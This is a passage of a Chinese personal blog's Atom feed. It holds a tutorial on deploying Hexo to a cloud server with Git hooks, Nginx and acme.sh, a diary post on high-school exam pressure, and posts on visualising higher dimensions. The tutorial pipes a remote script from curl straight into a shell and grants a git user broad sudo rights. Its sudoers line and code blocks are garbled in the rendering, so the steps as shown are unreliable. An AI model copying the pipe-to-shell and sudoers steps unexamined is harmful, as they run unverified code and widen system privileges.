        &lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;第一次发博这么积极欸。&lt;br /&gt;
虽然说是重安，但由于之前安的时候也是不假思索的依葫芦画瓢。所以第二次安，也是不太顺利，有一些地方也完全忘了。
      
    
    </summary>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>重新安装Hexo，并部署到云服务器</title>
    <link href="https://blog.rainbowyang.moe/post/Reinstall-Hexo.html"/>
    <id>https://blog.rainbowyang.moe/post/Reinstall-Hexo.html</id>
    <published>2018-08-06T11:22:45.000Z</published>
    <updated>2019-05-14T07:53:17.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>其实是重装了PC和云服务器，清理垃圾（linux用不来，xjb弄了好多莫名奇妙的东西），然后也就把东西重装一遍。</p><h2 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述</h2><p>主要就是三步：<br />1.在本地上装好Hexo<br />2.本地到云服务器用Git进行传递<br />3.云服务器用Nginx进行网站的部署</p><h2 id="step1-在本地上装好hexo"><a class="markdownIt-Anchor" href="#step1-在本地上装好hexo"></a> Step1 在本地上装好<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo</a></h2><p>（本Step的指令都是右键Git Bash Here，然后运行）<br />（复制并输入指令时，请忽略<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">和</span></span></span></span>之后的第一个空格，因为Git Bash已经有了）</p><h3 id="1-装好git和nodejs"><a class="markdownIt-Anchor" href="#1-装好git和nodejs"></a> 1. 装好<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>和<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a>。</h3><p><a></a></p><h3 id="2-安装hexo的库"><a class="markdownIt-Anchor" href="#2-安装hexo的库"></a> 2. 安装Hexo的库。</h3> <figure class="highlight plain"><figcaption><span>npm install -g hexo```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">### 3. 生成hexo的工作文件夹。</span><br><span class="line"> &#96;&#96;&#96;$ hexo init [文件夹路径]&#96;&#96;&#96;（如省略，则默认在右键开启Git Bash的文件夹生成）</span><br><span class="line"> </span><br><span class="line">### 4. 进入工作文件夹。</span><br><span class="line"> &#96;&#96;&#96;$ cd [文件夹路径]&#96;&#96;&#96;（第3步如果省略的话，那么当前已经是在工作文件夹了）</span><br><span class="line"> </span><br><span class="line">### 5. 安装git部署库</span><br><span class="line"> &#96;&#96;&#96;$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h3 id="6-为了用密钥登陆要生成公钥和密钥"><a class="markdownIt-Anchor" href="#6-为了用密钥登陆要生成公钥和密钥"></a> 6. 为了用密钥登陆，要生成公钥和密钥。</h3> <figure class="highlight plain"><figcaption><span>ssh-keygen -t rsa```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;span id&#x3D;&quot;end-of-step1&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">### 常用的[指令](https:&#x2F;&#x2F;hexo.io&#x2F;zh-cn&#x2F;docs&#x2F;commands)</span><br></pre></td></tr></table></figure><p>渲染:$ hexo g<br />本地服务器:$ hexo s<br />远程部署(git)😒 hexo d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## Step2 用Git进行部署</span><br><span class="line">首先要登录到云服务器的root。</span><br><span class="line"></span><br><span class="line">### 1. 安装Git</span><br><span class="line"> &#96;&#96;&#96;apt-get install git</span><br></pre></td></tr></table></figure><h3 id="2-git用户"><a class="markdownIt-Anchor" href="#2-git用户"></a> 2. Git用户</h3><ul><li>1.创建git用户</li></ul> <figure class="highlight plain"><figcaption><span>git```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+ 2.修改git权限</span><br><span class="line">    + 修改sudoers的文件权限，使其可以修改</span><br><span class="line">    &#96;&#96;&#96;chmod 740 &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><pre><code>+ 进入sudoers文件<figure class="highlight vim"><figcaption><span>/etc/sudoers```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    先按i，进入输入状态。</span><br><span class="line">    最后加上一行gitALL=(ALL) 。</span><br><span class="line">    按Esc退出输出状态。</span><br><span class="line">    再输入“:<span class="keyword">wq</span>” ,退出并保存。</span><br><span class="line"></span><br><span class="line">+ 修改sudoers的文件权限，使其不可以修改</span><br><span class="line">```chmod <span class="number">440</span> /etc/sudoers</span><br></pre></td></tr></table></figure></code></pre><h3 id="3-公钥"><a class="markdownIt-Anchor" href="#3-公钥"></a> 3. 公钥</h3><ul><li>1.进入git用户</li></ul> <figure class="highlight plain"><figcaption><span>git```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ 2.进入git根目录文件夹</span><br><span class="line"> &#96;&#96;&#96;cd ~</span><br></pre></td></tr></table></figure><ul><li>3.创建公钥文件夹</li></ul> <figure class="highlight plain"><figcaption><span>.ssh```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ 4.创建公钥文件</span><br><span class="line"> &#96;&#96;&#96;vim .&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><pre><code>+ 将之前在本地电脑生成的公钥内容（id_rsa.pub）复制到这个文件+ id_rsa.pub 一般会在C:\Users\\[Your Name]\\.ssh 里，或者可以直接搜索这个文件</code></pre><h3 id="4-git仓库"><a class="markdownIt-Anchor" href="#4-git仓库"></a> 4. git仓库</h3><ul><li>1.创建hexo.git文件夹</li></ul> <figure class="highlight plain"><figcaption><span>hexo.git```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ 2.进入hexo.git文件夹</span><br><span class="line"> &#96;&#96;&#96;cd hexo.git</span><br></pre></td></tr></table></figure><ul><li>3.建立git仓库</li></ul> <figure class="highlight plain"><figcaption><span>init --bare```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5. Hexo静态网址仓库</span><br><span class="line">+ 1.切换回root用户(指令中的root可以去掉，因为是默认)</span><br><span class="line"> &#96;&#96;&#96;su root</span><br></pre></td></tr></table></figure><ul><li>2.创建hexo静态网址文件夹</li></ul> <figure class="highlight plain"><figcaption><span>/var/www/hexo```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ 3.给予git用户相关权限</span><br><span class="line"> &#96;&#96;&#96;chown git:git -R &#x2F;var&#x2F;www&#x2F;hexo</span><br></pre></td></tr></table></figure><ul><li>4.切换回git用户</li></ul> <figure class="highlight plain"><figcaption><span>git```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+ 5.git hooks</span><br><span class="line">    + 创建hooks文件</span><br><span class="line">    &#96;&#96;&#96;vim &#x2F;home&#x2F;git&#x2F;hexo.git&#x2F;hooks&#x2F;post-receive</span><br></pre></td></tr></table></figure><pre><code>+ 添加内容    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">GIT_REPO&#x3D;&#x2F;home&#x2F;git&#x2F;hexo.git</span><br><span class="line">TMP_GIT_CLONE&#x3D;&#x2F;tmp&#x2F;hexo</span><br><span class="line">PUBLIC_WWW&#x3D;&#x2F;var&#x2F;www&#x2F;hexo</span><br><span class="line">rm -rf \$&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone \$GIT_REPO \$TMP_GIT_CLONE</span><br><span class="line">rm -rf \$&#123;PUBLIC_WWW&#125;&#x2F;*</span><br><span class="line">cp -rf \$&#123;TMP_GIT_CLONE&#125;&#x2F;* \$&#123;PUBLIC_WWW&#125;</span><br></pre></td></tr></table></figure>+ 为hooks文件添加运行权限<figure class="highlight plain"><figcaption><span>+x</span><a href="/home/git/hexo.git/hooks/post-receive```">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 6.另外</span><br><span class="line">部署Hexo需要在本地电脑运行，见[Step1结尾](#end-of-step1)。</span><br><span class="line"></span><br><span class="line">## Step3 Nginx部署静态网站</span><br><span class="line">### 1. 安装Nginx</span><br><span class="line"> &#96;&#96;&#96;apt-get install nginx</span><br></pre></td></tr></table></figure></code></pre><h3 id="2-网站配置文件"><a class="markdownIt-Anchor" href="#2-网站配置文件"></a> 2. 网站配置文件</h3> <figure class="highlight vim"><figcaption><span>/etc/nginx/sites-enabled/default```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">文件中有一些示例，要先用#注释或删除，然后在添加内容</span><br></pre></td></tr></table></figure><p>server{<br />listen 80;<br />listen [::]:80;</p><pre><code>server_name yourDomain;root /var/www/hexo;index index.html;location / {    try_files \$uri \$uri/ =404;}</code></pre><p>}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 3. 重启Nginx</span><br><span class="line"> &#96;&#96;&#96;service nginx restart</span><br></pre></td></tr></table></figure><h3 id="4-完毕"><a class="markdownIt-Anchor" href="#4-完毕"></a> 4. 完毕</h3><p>可以用域名或者服务器ip地址访问了。<br />但是如果被和我一样，因为没有备份然后被运营商拦截了，可以考虑下面Step4，加密之后就不会被拦截了</p><h2 id="附加step4添加ca证书进行加密"><a class="markdownIt-Anchor" href="#附加step4添加ca证书进行加密"></a> (附加)Step4.添加CA证书进行加密</h2><p>参考并使用<a href="https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">Neilpang/acme.sh</a>，下面简易介绍。</p><h3 id="0-为了方便和避免出问题切换到root"><a class="markdownIt-Anchor" href="#0-为了方便和避免出问题切换到root"></a> 0. 为了方便，和避免出问题，切换到root</h3> <figure class="highlight plain"><figcaption><span>root```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 1. 安装acme.sh</span><br><span class="line"> &#96;&#96;&#96;curl  https:&#x2F;&#x2F;get.acme.sh | sh</span><br></pre></td></tr></table></figure><h3 id="2-添加简写链接"><a class="markdownIt-Anchor" href="#2-添加简写链接"></a> 2. 添加简写链接</h3> <figure class="highlight plain"><figcaption><span>acme.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### 3. 域名和服务器所有权证明</span><br><span class="line">+ 1.生成TXT验证字段</span><br><span class="line">如果有多个域名，可以在第一个域名后面再加上&quot;-d [your-other-domain]&quot;，注意空格隔开。</span><br><span class="line"> &#96;&#96;&#96;acme.sh --issue -d [your-domain] --dns --yes-I-know-dns-manual-mode-enough-go-ahead-please</span><br></pre></td></tr></table></figure><ul><li>2.添加TXT记录（输出已经讲的很清楚了）<br />在域名的DNS解析管理里给_acme-challenge.[your-domain]添加TXT记录。<br />内容来自输出，字段已经高亮显示。</li><li>3.生成CA证书</li></ul> <figure class="highlight plain"><figcaption><span>--renew -d [your-domain] --yes-I-know-dns-manual-mode-enough-go-ahead-please```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">证书会在&#x2F;root&#x2F;.acme.sh&#x2F;[your-domain]&#x2F;[your-domain].cer</span><br><span class="line"></span><br><span class="line">### 4. 配置CA证书到Nginx（修改网站配置文件）</span><br><span class="line">+ 将 listen 的&quot;80&quot;改成&quot;443 ssl&quot;</span><br><span class="line">+ 然后在下面添加</span><br></pre></td></tr></table></figure><p>ssl_certificate/root/.acme.sh/[your-domain]/[your-domain].cer;<br />ssl_certificate_key/root/.acme.sh/[your-domain]/[your-domain].key;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5. 重启Nginx</span><br><span class="line"> &#96;&#96;&#96;service nginx restart</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;其实是重装了PC和云服务器，清理垃圾（linux用不来，xjb弄了好多莫名奇妙的东西），然后也就把东西重装一遍。&lt;/p&gt;
&lt;h2 id=&quot;简述&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="博客" scheme="https://blog.rainbowyang.moe/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>随谈</title>
    <link href="https://blog.rainbowyang.moe/post/Daily/Daily-Talk-1.html"/>
    <id>https://blog.rainbowyang.moe/post/Daily/Daily-Talk-1.html</id>
    <published>2018-04-29T13:47:15.000Z</published>
    <updated>2019-07-02T07:50:20.520Z</updated>
    
    <content type="html"><![CDATA[<p>自去年起，便许久不写博客了。打算晚上扯点什么。</p><p>说实话我不是一个喜欢把生活动态一直记录下来的人，包括在某企鹅的那个好友动态上也不常发过什么说说。因为当你发了说说之后，如没人留言加点赞似乎便有些奇怪，有人留言不回复又不可取。特别是发了个说说之后，貌似会被以消息的方式被推送到好友，但也不一定，具体的推送我还没看懂。</p><p>但由于说实话，自己并不喜欢无聊的交际来扩充自己的交际圈或者说人脉，总之显得似乎有些格格不入，生日礼物的互送也往往没有我的参与。正所谓礼尚往来，比如说当表弟的妈妈给了我压岁钱的时候，我妈就应该也给表弟压岁钱以示回应。当别人送了生日礼物之后，收礼者也当还之。在一帮似乎迷恋“农药”游戏的同学之间，这就成了互送游戏里的皮肤。在这里也并不是想说这种事不好，但我总觉得毫无兴致维持看似广袤的交际。</p><p>由此，这个博客网址我也从未曾向班里同学推荐过<del>（都没什么东西，你还好意思推荐）</del></p><p>自去年11月起，一直到现在浙江的选考尘埃落定，表面上看似是在精心准备考试（<del>话说也是有两科(物理，技术)100，一科（化学）91[手动滑稽]</del>）而疏于在技术方面的学习 。但真正的更是心没有静下来，没有找到自己真正想做的事情。或者更应该说是，似乎不知道自己到底向往那个方向走。</p><p>在之前的几个月里，平时回到家也不看书，也没研究什么。时间主要被消遣在无太大意义的网上闲逛，偶尔看到什么也难以静下心来去认真研究。一方面主要是因为一星期只放不到24小时，回到家似乎失去什么动力；另一方面，就是每星期积累下来的懒，周周复返，想着好久也都没干什么了，这次也就算了。有些东西被迫停止之后，再要动起来可能就更费力了（正如最大静摩擦力大于滑动摩擦力）。</p><p>在浙江高考模式的选考结束之后，剩下的便是语数外（有些人英语也不学了）。学校的排课也变得霸气无比，三门课排列也就是3!＝６，所以一周六天的课变的每天都不一样，真是每天都有新鲜感，新鲜感爆棚呢。至于上的课也陷入某种诡异的重复，语文是发试卷机加PPT答案放映员，数学是懵逼思路大讲加算到一半太烦了好了就这样答案抄一下，英语是全中文讲解除了some extramely perfect words and some extramely perfect phrases and some extramely perfect sentenses.　有多少老师紧紧握住考试大纲好似尚方宝剑，感觉出那些高考不会考的题目的人都是水平低，又有多少老师将印刷体书写、句式结构复杂、但真实意义犹如狗屎的文章视如范文。当在英语老师将语法结构凌驾于句意之上，甚至觉得被动句就是比主动句好的时候，英语教学又会是何去何从？</p><p>当高中最后的学习纯粹只是为高考分数，当老师重点的关注对象就是那些最好的和临界的（上了什么什么线可以加人头），学校不会再去在意你到底学到了什么，只在乎你考了多少，一个个生命的青春终而只能成为一张破纸上的数据，甚至还惨不忍睹。当班主任习惯性的只凭几个数字来感觉一个人的状态，无关而有用（甚至是别人觉的没用的）的东西都要被迫靠边站吗？或觉为了上一个好的大学来接受所谓的更好教育，暂时放一下所谓与高考无关事情又无妨。但这种事在初中不曾出现么？为了进重点高中，是否也曾放下？而今再次放下。一次一次的放弃抹杀着本就偶然而得的兴趣与爱好。为了将来而放下眼前去苟且，这会是勾践的卧薪尝胆么？</p><p>当一个人愿意用眼前苟且来换取他人所说的未来的空中楼阁，那么大学并不会是个尽头，而更是个开始，正如一匹被一根绑在自己身上的胡萝卜吸引着向前的驴。</p><p>不断向前苟且，终将湮为灰烬。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;自去年起，便许久不写博客了。打算晚上扯点什么。&lt;/p&gt;
&lt;p&gt;说实话我不是一个喜欢把生活动态一直记录下来的人，包括在某企鹅的那个好友动态上也不常发过什么说说。因为当你发了说说之后，如没人留言加点赞似乎便有些奇怪，有人留言不回复又不可取。特别是发了个说说之后，貌似会被以消息的
      
    
    </summary>
    
    
      <category term="Daily" scheme="https://blog.rainbowyang.moe/categories/Daily/"/>
    
    
      <category term="日常" scheme="https://blog.rainbowyang.moe/tags/%E6%97%A5%E5%B8%B8/"/>
    
      <category term="思考" scheme="https://blog.rainbowyang.moe/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>空间探索[1]:高维探索</title>
    <link href="https://blog.rainbowyang.moe/post/Math/Space-1.html"/>
    <id>https://blog.rainbowyang.moe/post/Math/Space-1.html</id>
    <published>2017-09-30T12:51:00.000Z</published>
    <updated>2020-07-16T03:25:06.451Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引子"><a class="markdownIt-Anchor" href="#引子"></a> 引子</h2><p>我们处在三维空间之中(别扯四维时空，你先要知道那到底是啥)，所以对于三维空间的理解和想象都显得十分的自然。</p><p>但是三维空间之上，比如四维空间，到底意味这什么？ 在这里，我并不是想涉及到其物理意义，而只是纯粹的数学上的欧几里得空间。</p><h2 id="维"><a class="markdownIt-Anchor" href="#维"></a> 维</h2><p>维度，意味着一个独一无二的方向。它只能由它自己来表达，其他的维度投影到这个方向上都应该成为一个点。</p><p>这就意味着所有的维度都是正交（垂直）的，然后一起张开了这个几何空间。</p><p>维度其实也可以看成一个轴，在下面我可能会混合使用。</p><h3 id="表示方法"><a class="markdownIt-Anchor" href="#表示方法"></a> 表示方法</h3><h4 id="引入"><a class="markdownIt-Anchor" href="#引入"></a> 引入</h4><p>首先想象一个三维坐标系，然后把它投影在在一个平面上（其实就算在脑海里，它也已经是二维的，只是感觉是三维）。</p><p>可以把他画在纸上，很显然在一张二维的纸上，要画三个维度（坐标轴）并且让他们互相垂直是不可能的。</p><p>所以对于第三维度（z 轴），一般会在 x 轴向右，y 轴向上的情况下，把 z 轴向左下角画。虽然并没有垂直，但是可以自然的感到这是由于投影造成的。</p><p>由于习惯了对三维的思考，所以这种画在二维的三维图像还是很容易还原回成三维的感觉。</p><p>事实上，作为三维生物，我们的眼睛看到的其实是二维的东西（也就是那层视网膜所得到的）。</p><p>包括平时生活中的各种显示器也就都是二维的，要想在上面显示出一个东西，那也就是二维的图像。</p><h4 id="表示"><a class="markdownIt-Anchor" href="#表示"></a> 表示</h4><p>那么归根结底，一个维度投影到我们所看到的二维上，就可以用一个视觉角度（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">θs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord mathdefault">s</span></span></span></span>）和一个视觉长度（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">ls</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span></span></span></span>）来表示了。</p><h5 id="视觉角度"><a class="markdownIt-Anchor" href="#视觉角度"></a> 视觉角度</h5><p>这个视觉角度，其实也就是上下左右的方向，用一个角度就可以表示了。这个角度我更习惯于以 3 点钟方向为开始，然后逆时针递增（其实也就是平面直角坐标系里面类似的倾斜角的定义）。</p><h5 id="视觉长度"><a class="markdownIt-Anchor" href="#视觉长度"></a> 视觉长度</h5><p>至于视觉长度，其实并不是说其单位长度有多长，而是看上去的长度和原来的长度的比值。</p><p>也就是说当观察者的视线和这个维度垂直的时候，看到的是最长的（我把这定为 1，或者理解为 100%）；然后想象一下把这个维度慢慢地朝着自己，最后当它完全指向你的时候，所能看到的就是一个点（这就是 0%）。</p><p>那么定义视线和维度的夹角为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">θs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord mathdefault">s</span></span></span></span>，那么上面说的这个值也就是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>θ</mi><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sin(θs)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>。</p><p>所以一个轴就可以定义为（角度，视觉长度）</p><p>我们所习惯的平面直角坐标系就可以用{ x 轴(0°，100%), y 轴(90°，100%) }来表示（但是我更习惯弧度，也就是{ x 轴(0，1), y 轴(π/2，1) }）。</p><p>在这里也可以用一个复数来表示一个维度，其幅角和模刚好对应上面的角度和视觉长度，所以上面那个二维的坐标系也可以表示为也就是{ x 轴(1+0i), y 轴(0+1i) }。</p><h2 id="坐标系"><a class="markdownIt-Anchor" href="#坐标系"></a> 坐标系</h2><p>坐标系，由一些应该在其空间上相互垂直的维度组成。</p><p>虽然可以在二维的屏幕上用上面的方式表示维度的投影之后的样子，但这并不意味这任意的组合都可以给人一种所有的轴之间互相垂直的感觉。</p><h3 id="简单维度"><a class="markdownIt-Anchor" href="#简单维度"></a> 简单维度</h3><h4 id="二维"><a class="markdownIt-Anchor" href="#二维"></a> 二维</h4><p>在二维的时候，视觉长度无疑都应该是 100%。（不然就是像三维的了）</p><p>但是对于其角度，就应该满足差为 90°。因为只有这样才有维度之间垂直的感觉。</p><h4 id="三维"><a class="markdownIt-Anchor" href="#三维"></a> 三维</h4><p>可以先想象一下二维坐标系，然后想象着第三维（z 轴）在这个时候正对着你（就像俯视还没发射的火箭？）。</p><p>接着将 z 轴与视线偏离，这时 z 轴的视觉长度将会从 0 开始增加，同时 x 轴和 y 轴的视觉长度会被向 z 轴的压缩。</p><h3 id="高维推广"><a class="markdownIt-Anchor" href="#高维推广"></a> 高维推广</h3><p>既然在上面的三维里面，当增加一个维度的视觉长度的时候，会导致其他维度视觉长度的减少，那么会不会有一个特殊的等式呢？</p><p>事实如此，在三维的情况下，假设有以原点为起点，分别以（R,0,0），（0,R,0），（0,0,R）为终点的三条线段同时平行投影到一个平面上，那么其长度的平方和为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><msup><mi>R</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">2R^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>。</p><p>当然在二维的时候，这个结论也毫无疑问的成立。</p><p>那么为什么不能推广到高维呢？</p><h4 id="从二维到三维"><a class="markdownIt-Anchor" href="#从二维到三维"></a> 从二维到三维</h4><p>假设在平面上有一个圆，无论怎么旋转，它仍然是一个圆。</p><p>除非偏离垂直那个平面的视线，从侧面看它。这时候，这个圆就毫无疑问变成了看上去的椭圆，但是都可以看出这就是圆。这都是因为在三维的世界中生活，让这种变形非常容易理解。</p><h4 id="从三维到四维"><a class="markdownIt-Anchor" href="#从三维到四维"></a> 从三维到四维</h4><p>同样的，想象一个球，无论怎么旋转，它仍然是一个球。</p><p>那么，然后视线偏离！</p><p>你可以想象一个画在平面上的球，然后像二维到三维一样，从侧面去看，那么正如圆变成椭圆一样，这个在三维不管怎么看都一样的球变成了一个椭球。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;引子&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#引子&quot;&gt;&lt;/a&gt; 引子&lt;/h2&gt;
&lt;p&gt;我们处在三维空间之中(别扯四维时空，你先要知道那到底是啥)，所以对于三维空间的理解和想象都显得十分的自然。&lt;/p&gt;
&lt;p&gt;但是三维空间之上，比如
      
    
    </summary>
    
    
      <category term="Math" scheme="https://blog.rainbowyang.moe/categories/Math/"/>
    
    
      <category term="数学" scheme="https://blog.rainbowyang.moe/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="空间" scheme="https://blog.rainbowyang.moe/tags/%E7%A9%BA%E9%97%B4/"/>
    
  </entry>
  
  <entry>
    <title>空间探索[0]:前言</title>
    <link href="https://blog.rainbowyang.moe/post/Math/Space-0.html"/>
    <id>https://blog.rainbowyang.moe/post/Math/Space-0.html</id>
    <published>2017-09-30T12:12:00.000Z</published>
    <updated>2020-07-16T03:21:59.494Z</updated>
    
    <content type="html"><![CDATA[<p>空间，在这里我更想说的是数学意义上的空间。你或许对三维空间习以为常，但是可曾想过四维呢？</p><p>在做<a href="https://github.com/RainbowYang/FunctionPainter" target="_blank" rel="noopener">FunctionPainter</a>的时候，引发了一些我对于空间可视化的探索和思考，继而得到一些想法或说是猜测。</p><p>这些想法零零总总，所以想在这记录下来。</p><p>下面是编号,但前后不一定有什么密切的逻辑顺序.</p><ol><li><a href="/post/Math/Space-1.html">空间探索[1]:高维探索</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;空间，在这里我更想说的是数学意义上的空间。你或许对三维空间习以为常，但是可曾想过四维呢？&lt;/p&gt;
&lt;p&gt;在做&lt;a href=&quot;https://github.com/RainbowYang/FunctionPainter&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
    
      <category term="Math" scheme="https://blog.rainbowyang.moe/categories/Math/"/>
    
    
      <category term="数学" scheme="https://blog.rainbowyang.moe/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="空间" scheme="https://blog.rainbowyang.moe/tags/%E7%A9%BA%E9%97%B4/"/>
    
  </entry>
  
  <entry>
    <title>十七之思</title>
    <link href="https://blog.rainbowyang.moe/post/Daily/Thinking-at-17.html"/>
    <id>https://blog.rainbowyang.moe/post/Daily/Thinking-at-17.html</id>
    <published>2017-05-30T02:21:00.000Z</published>
    <updated>2019-07-02T06:55:32.944Z</updated>
    
